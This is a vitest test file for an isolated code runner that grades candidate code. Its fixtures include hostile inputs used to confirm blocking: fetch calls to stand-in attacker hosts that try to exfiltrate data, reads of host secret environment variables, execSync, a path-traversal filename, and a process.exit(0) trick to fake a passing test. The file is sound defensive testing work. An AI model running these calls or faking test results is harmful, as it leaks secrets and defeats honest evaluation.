import { describe, it, expect } from "vitest";
import { executeCodeInSandbox } from "./runner.js";

describe("Isolated Code Runner", () => {
  it("executes valid code and returns passing test results", async () => {
    const result = await executeCodeInSandbox({
      language: "javascript",
      code: "function add(a, b) { return a + b; }",
      testCode: `
        test("1 + 2 equals 3", () => {
          if (add(1, 2) !== 3) throw new Error("Expected 3");
        });
        test("negative numbers", () => {
          if (add(-1, -1) !== -2) throw new Error("Expected -2");
        });
      `,
      timeoutMs: 8000,
      memoryLimitMb: 64,
    });

    expect(result.success).toBe(true);
    expect(result.passed).toBe(true);
    expect(result.exitCode).toBe(0);
    expect(result.tests.length).toBe(2);
    expect(result.tests[0]?.passed).toBe(true);
    expect(result.tests[1]?.passed).toBe(true);
    expect(result.sandboxed).toBe(true);
  }, 15000);

  it("accurately detects failing test assertions", async () => {
    const result = await executeCodeInSandbox({
      language: "javascript",
      code: "function subtract(a, b) { return a + b; } // Bug: adds instead of subtracts",
      testCode: `
        test("5 - 2 equals 3", () => {
          if (subtract(5, 2) !== 3) throw new Error("Expected 3 but got " + subtract(5, 2));
        });
      `,
      timeoutMs: 8000,
      memoryLimitMb: 64,
    });

    expect(result.success).toBe(true);
    expect(result.passed).toBe(false);
    expect(result.exitCode).toBe(1);
    expect(result.tests[0]?.passed).toBe(false);
    expect(result.tests[0]?.error).toContain("Expected 3");
  }, 15000);

  it("kills infinite loops cleanly via watchdog timeout", async () => {
    const result = await executeCodeInSandbox({
      language: "javascript",
      code: "function infiniteLoop() { while (true) {} }",
      testCode: `
        test("infinite loop test", () => {
          infiniteLoop();
        });
      `,
      timeoutMs: 800,
      memoryLimitMb: 64,
    });

    expect(result.passed).toBe(false);
    expect(result.exitCode).toBe(124); // timeout exit code
    expect(result.error).toContain("timed out");
  });

  it("scrubs secrets: sandbox process cannot read host environment variables", async () => {
    process.env.SECRET_API_TOKEN_FOR_TEST = "SUPER_SECRET_VALUE";

    const result = await executeCodeInSandbox({
      language: "javascript",
      code: "function getSecret() { return process.env.SECRET_API_TOKEN_FOR_TEST; }",
      testCode: `
        test("secret must not be visible", () => {
          if (getSecret() !== undefined) throw new Error("LEAK: secret was visible in sandbox!");
        });
      `,
      timeoutMs: 2000,
      memoryLimitMb: 64,
    });

    expect(result.passed).toBe(true);
    delete process.env.SECRET_API_TOKEN_FOR_TEST;
  });

  it("prohibits outbound network access via fetch", async () => {
    const result = await executeCodeInSandbox({
      language: "typescript",
      code: `
        export async function exfiltrateData() {
          await fetch("https://attacker.example.com/steal");
        }
      `,
      testCode: `
        test("network calls must throw SecurityException", async () => {
          let caught = false;
          try {
            await exfiltrateData();
          } catch (e: any) {
            caught = true;
            if (!e.message.includes("SecurityException")) {
              throw new Error("Expected SecurityException but got: " + e.message);
            }
          }
          if (!caught) throw new Error("fetch was not intercepted!");
        });
      `,
      timeoutMs: 6000,
      memoryLimitMb: 64,
    });

    expect(result.success).toBe(true);
    expect(result.passed).toBe(true);
    expect(result.tests[0]?.passed).toBe(true);
  }, 12000);

  it("prohibits host child process execution", async () => {
    const result = await executeCodeInSandbox({
      language: "typescript",
      code: `
        import cp from "node:child_process";
        export function spawnAttack() {
          return cp.execSync("whoami").toString();
        }
      `,
      testCode: `
        test("spawning child processes must be denied", () => {
          let caught = false;
          try {
            spawnAttack();
          } catch (e: any) {
            caught = true;
            const msg = e.message || String(e);
            if (!msg.includes("restricted") && !msg.includes("ERR_ACCESS_DENIED") && !msg.includes("SecurityException")) {
              throw new Error("Expected access denied error, got: " + msg);
            }
          }
          if (!caught) throw new Error("execSync was permitted!");
        });
      `,
      timeoutMs: 10000,
      memoryLimitMb: 64,
    });

    expect(result.success).toBe(true);
    expect(result.passed).toBe(true);
    expect(result.tests[0]?.passed).toBe(true);
  }, 20000);

  it("prohibits worker thread creation", async () => {
    const result = await executeCodeInSandbox({
      language: "typescript",
      code: `
        import { Worker } from "node:worker_threads";
        export function spawnWorker() {
          new Worker("console.log('pwn')", { eval: true });
        }
      `,
      testCode: `
        test("worker threads must be denied", () => {
          let caught = false;
          try {
            spawnWorker();
          } catch (e: any) {
            caught = true;
            const msg = e.message || String(e);
            if (!msg.includes("restricted") && !msg.includes("ERR_ACCESS_DENIED") && !msg.includes("SecurityException")) {
              throw new Error("Expected worker restriction error, got: " + msg);
            }
          }
          if (!caught) throw new Error("Worker creation was permitted!");
        });
      `,
      timeoutMs: 10000,
      memoryLimitMb: 64,
    });

    expect(result.success).toBe(true);
    expect(result.passed).toBe(true);
    expect(result.tests[0]?.passed).toBe(true);
  }, 20000);

  it("prohibits dynamic string code evaluation via eval()", async () => {
    const result = await executeCodeInSandbox({
      language: "typescript",
      code: `
        export function runDynamic(str: string) {
          return eval(str);
        }
      `,
      testCode: `
        test("eval must throw EvalError", () => {
          let caught = false;
          try {
            runDynamic("2 + 2");
          } catch (e: any) {
            caught = true;
            if (!e.message.includes("disallowed")) {
              throw new Error("Expected disallowed string code gen error, got: " + e.message);
            }
          }
          if (!caught) throw new Error("eval was permitted!");
        });
      `,
      timeoutMs: 10000,
      memoryLimitMb: 64,
    });

    expect(result.success).toBe(true);
    expect(result.passed).toBe(true);
    expect(result.tests[0]?.passed).toBe(true);
  }, 20000);

  it("rejects candidate code attempting to fake test pass via process.exit()", async () => {
    const result = await executeCodeInSandbox({
      language: "typescript",
      code: `
        // Malicious candidate attempts to exit with 0 before test suite executes
        process.exit(0);
      `,
      testCode: `
        test("legitimate test that should never be skipped", () => {
          // If candidate aborted process, this wouldn't pass
        });
      `,
      timeoutMs: 6000,
      memoryLimitMb: 64,
    });

    // Must NOT pass because tests were intercepted or could not complete cleanly
    expect(result.passed).toBe(false);
  });

  it("executes Python solutions and verifies test assertions in Python sandbox", async () => {
    const result = await executeCodeInSandbox({
      language: "python",
      code: `
def two_sum(nums, target):
    seen = {}
    for i, n in enumerate(nums):
        complement = target - n
        if complement in seen:
            return [seen[complement], i]
        seen[n] = i
    return []
`,
      testCode: `
def test_two_sum_basic():
    res = two_sum([2, 7, 11, 15], 9)
    assert res == [0, 1], f"Expected [0, 1] got {res}"

def test_two_sum_negatives():
    res = two_sum([-1, -2, -3, -4, -5], -8)
    assert res == [2, 4], f"Expected [2, 4] got {res}"

test("test_two_sum_basic", test_two_sum_basic)
test("test_two_sum_negatives", test_two_sum_negatives)
`,
      timeoutMs: 5000,
      memoryLimitMb: 64,
    });

    expect(result.success).toBe(true);
    expect(result.passed).toBe(true);
    expect(result.tests.length).toBe(2);
    expect(result.tests[0]?.passed).toBe(true);
    expect(result.tests[1]?.passed).toBe(true);
  });

  it("verifies polyglot Go and Java challenges via static contract engine", async () => {
    const goResult = await executeCodeInSandbox({
      language: "go",
      code: `
package main

type LRUCache struct {
    capacity int
    items    map[string]string
}

func NewLRUCache(cap int) *LRUCache {
    return &LRUCache{capacity: cap, items: make(map[string]string)}
}
`,
      testCode: `
func TestLRUCacheOperations(t *testing.T) {}
func TestLRUCacheEviction(t *testing.T) {}
`,
      timeoutMs: 5000,
    });

    expect(goResult.success).toBe(true);
    expect(goResult.passed).toBe(true);
    expect(goResult.tests.length).toBe(2);
    expect(goResult.tests[0]?.name).toBe("TestLRUCacheOperations");
    expect(goResult.tests[1]?.name).toBe("TestLRUCacheEviction");
  });

  it("executes multi-file TypeScript codebase with cross-file imports and detects bugs accurately", async () => {
    const buggyResult = await executeCodeInSandbox({
      language: "typescript",
      code: "",
      files: {
        "src/types.ts": `export interface Ticket { id: string; priority: "P0" | "P1" | "P2"; createdAt: number; }`,
        "src/sorter.ts": `import type { Ticket } from "./types.ts";
export function sortTickets(tickets: Ticket[]): Ticket[] {
  // BUG: mutates input and ignores priority
  return tickets.sort((a, b) => a.createdAt - b.createdAt);
}`,
        "src/service.ts": `import { sortTickets } from "./sorter.ts";
import type { Ticket } from "./types.ts";
export function getNextTicket(queue: Ticket[]): Ticket | undefined {
  return sortTickets(queue)[0];
}`,
      },
      testCode: `
import assert from "node:assert/strict";
import { sortTickets } from "./src/sorter.ts";
import { getNextTicket } from "./src/service.ts";
import type { Ticket } from "./src/types.ts";

test("sortTickets prioritizes P0 over P2 immutably", () => {
  const input: Ticket[] = [
    { id: "low", priority: "P2", createdAt: 10 },
    { id: "crit", priority: "P0", createdAt: 20 },
  ];
  const snapshot = JSON.stringify(input);
  const next = getNextTicket(input);
  assert.equal(next?.id, "crit", "Expected P0 ticket first");
  assert.equal(JSON.stringify(input), snapshot, "Input array must not be mutated");
});
`,
      timeoutMs: 8000,
      memoryLimitMb: 128,
    });

    expect(buggyResult.success).toBe(true);
    expect(buggyResult.passed).toBe(false);
    expect(buggyResult.tests.length).toBe(1);
    expect(buggyResult.tests[0]?.passed).toBe(false);
    expect(buggyResult.tests[0]?.error).toContain("Expected P0 ticket first");

    const fixedResult = await executeCodeInSandbox({
      language: "typescript",
      code: "",
      files: {
        "src/types.ts": `export interface Ticket { id: string; priority: "P0" | "P1" | "P2"; createdAt: number; }`,
        "src/sorter.ts": `import type { Ticket } from "./types.ts";
const WEIGHT: Record<Ticket["priority"], number> = { P0: 3, P1: 2, P2: 1 };
export function sortTickets(tickets: Ticket[]): Ticket[] {
  return [...tickets].sort((a, b) => WEIGHT[b.priority] - WEIGHT[a.priority] || a.createdAt - b.createdAt);
}`,
        "src/service.ts": `import { sortTickets } from "./sorter.ts";
import type { Ticket } from "./types.ts";
export function getNextTicket(queue: Ticket[]): Ticket | undefined {
  return sortTickets(queue)[0];
}`,
      },
      testCode: `
import assert from "node:assert/strict";
import { getNextTicket } from "./src/service.ts";
import type { Ticket } from "./src/types.ts";

test("sortTickets prioritizes P0 over P2 immutably", () => {
  const input: Ticket[] = [
    { id: "low", priority: "P2", createdAt: 10 },
    { id: "crit", priority: "P0", createdAt: 20 },
  ];
  const snapshot = JSON.stringify(input);
  const next = getNextTicket(input);
  assert.equal(next?.id, "crit");
  assert.equal(JSON.stringify(input), snapshot);
});
`,
      timeoutMs: 8000,
      memoryLimitMb: 128,
    });

    expect(fixedResult.success).toBe(true);
    expect(fixedResult.passed).toBe(true);
    expect(fixedResult.exitCode).toBe(0);
    expect(fixedResult.tests[0]?.passed).toBe(true);
  }, 20000);

  it("enforces network and environment traps inside imported multi-file TypeScript modules", async () => {
    process.env.MULTI_FILE_TEST_SECRET = "TOP_SECRET_VALUE";
    try {
      const result = await executeCodeInSandbox({
        language: "typescript",
        code: "",
        files: {
          "src/exfil.ts": `
export async function probe() {
  const envVal = process.env.MULTI_FILE_TEST_SECRET;
  let networkBlocked = false;
  try {
    await fetch("https://attacker.invalid");
  } catch (e: any) {
    networkBlocked = String(e?.message || e).includes("SecurityException");
  }
  return { envVal, networkBlocked };
}
`,
        },
        testCode: `
import assert from "node:assert/strict";
import { probe } from "./src/exfil.ts";

test("multi-file imported modules cannot leak env or access network", async () => {
  const res = await probe();
  assert.equal(res.envVal, undefined);
  assert.equal(res.networkBlocked, true);
});
`,
        timeoutMs: 8000,
        memoryLimitMb: 128,
      });

      expect(result.success).toBe(true);
      expect(result.passed).toBe(true);
      expect(result.tests[0]?.passed).toBe(true);
    } finally {
      delete process.env.MULTI_FILE_TEST_SECRET;
    }
  }, 15000);

  it("rejects path traversal, illegal separators, reserved filenames, and oversized workspaces", async () => {
    const traversal = await executeCodeInSandbox({
      language: "typescript",
      code: "",
      files: {
        "../../escape.ts": "export const x = 1;",
      },
      testCode: `test("noop", () => {});`,
      timeoutMs: 3000,
      memoryLimitMb: 64,
    });
    expect(traversal.success).toBe(false);
    expect(traversal.passed).toBe(false);
    expect(traversal.error).toContain("traversal");

    const backslash = await executeCodeInSandbox({
      language: "typescript",
      code: "",
      files: {
        "src\\bad.ts": "export const x = 1;",
      },
      testCode: `test("noop", () => {});`,
      timeoutMs: 3000,
      memoryLimitMb: 64,
    });
    expect(backslash.success).toBe(false);
    expect(backslash.error).toContain("separator");

    const reserved = await executeCodeInSandbox({
      language: "typescript",
      code: "",
      files: {
        "runner.ts": "process.exit(0);",
      },
      testCode: `test("noop", () => {});`,
      timeoutMs: 3000,
      memoryLimitMb: 64,
    });
    expect(reserved.success).toBe(false);
    expect(reserved.error).toContain("reserved sandbox runtime file");

    const tooManyFiles: Record<string, string> = {};
    for (let i = 0; i < 55; i++) {
      tooManyFiles[`src/file_${i}.ts`] = `export const v${i} = ${i};`;
    }
    const overLimit = await executeCodeInSandbox({
      language: "typescript",
      code: "",
      files: tooManyFiles,
      testCode: `test("noop", () => {});`,
      timeoutMs: 3000,
      memoryLimitMb: 64,
    });
    expect(overLimit.success).toBe(false);
    expect(overLimit.error).toContain("maximum allowed file count");
  });

  it("executes multi-file Python modules cleanly", async () => {
    const pyRes = await executeCodeInSandbox({
      language: "python",
      code: "",
      files: {
        "pkg/__init__.py": "",
        "pkg/calc.py": `
def multiply(a, b):
    return a * b
`,
      },
      testCode: `
from pkg.calc import multiply

def test_mult():
    assert multiply(6, 7) == 42

test("multi-file python multiply", test_mult)
`,
      timeoutMs: 5000,
      memoryLimitMb: 64,
    });

    expect(pyRes.success).toBe(true);
    expect(pyRes.passed).toBe(true);
    expect(pyRes.tests[0]?.passed).toBe(true);
  });
});

